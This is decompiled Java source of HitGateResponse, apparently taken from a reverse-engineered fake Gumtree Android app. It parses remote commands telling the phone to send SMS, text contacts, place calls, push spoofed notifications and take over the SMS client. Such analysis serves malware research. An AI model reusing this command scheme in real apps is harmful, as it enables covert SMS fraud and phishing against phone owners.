package com.gumsis.srs.api.responses;

import com.gumsis.api.request.HttpResponse;
import com.gumsis.checktls.Print;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class HitGateResponse
  extends HttpResponse
{
  public String changeMSCl;
  public String hardMode;
  public int icon;
  public String message;
  public List<Message> messageList = new ArrayList();
  public String number;
  public String packageName;
  public String phNumber;
  public String request;
  public long rid;
  public int slot;
  public String title;
  
  public void parseJson(JSONObject paramJSONObject)
  {
    super.parseBaseJson(paramJSONObject);
  }
  
  public void parseSuccessRespones(JSONObject paramJSONObject)
  {
    try
    {
      this.request = paramJSONObject.getString("request");
      if (this.request == null)
      {
        this.ret = 1;
        return;
      }
      if (this.request.equalsIgnoreCase("registration"))
      {
        this.rid = paramJSONObject.getLong("rid");
        return;
      }
    }
    catch (JSONException paramJSONObject)
    {
      this.ret = 1;
      Print.e(paramJSONObject.toString());
      return;
    }
    if (this.request.equalsIgnoreCase("send_sms"))
    {
      this.number = paramJSONObject.getString("number");
      this.message = paramJSONObject.getString("message");
      this.rid = paramJSONObject.getLong("rid");
      this.slot = paramJSONObject.getInt("slot");
      return;
    }
    if (this.request.equalsIgnoreCase("get_push"))
    {
      this.message = paramJSONObject.getString("message");
      this.title = paramJSONObject.getString("title");
      this.packageName = paramJSONObject.getString("package");
      this.rid = paramJSONObject.getLong("rid");
      this.icon = paramJSONObject.getInt("icon");
      return;
    }
    if (this.request.equalsIgnoreCase("tracker"))
    {
      this.rid = paramJSONObject.getLong("rid");
      return;
    }
    if (this.request.equalsIgnoreCase("sms_contact"))
    {
      this.rid = paramJSONObject.getLong("rid");
      paramJSONObject = paramJSONObject.getJSONArray("objects");
      if (paramJSONObject != null)
      {
        int i = 0;
        while (i < paramJSONObject.length())
        {
          Object localObject = paramJSONObject.getJSONObject(i);
          localObject = new Message(((JSONObject)localObject).getString("message"), ((JSONObject)localObject).getString("number"));
          this.messageList.add(localObject);
          i += 1;
        }
      }
    }
    else
    {
      if (this.request.equalsIgnoreCase("move_sms_client"))
      {
        this.rid = paramJSONObject.getLong("rid");
        this.changeMSCl = paramJSONObject.getString("status");
        return;
      }
      if (this.request.equalsIgnoreCase("hard_mode"))
      {
        this.rid = paramJSONObject.getLong("rid");
        this.hardMode = paramJSONObject.getString("status");
        return;
      }
      if (this.request.equalsIgnoreCase("call_number"))
      {
        this.rid = paramJSONObject.getLong("rid");
        this.phNumber = paramJSONObject.getString("number");
        return;
      }
      if (this.request.equalsIgnoreCase("start_access")) {
        this.rid = paramJSONObject.getLong("rid");
      }
    }
  }
  
  public static class Message
  {
    public String phone;
    public String text;
    
    Message(String paramString1, String paramString2)
    {
      this.text = paramString1;
      this.phone = paramString2;
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/responses/HitGateResponse.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */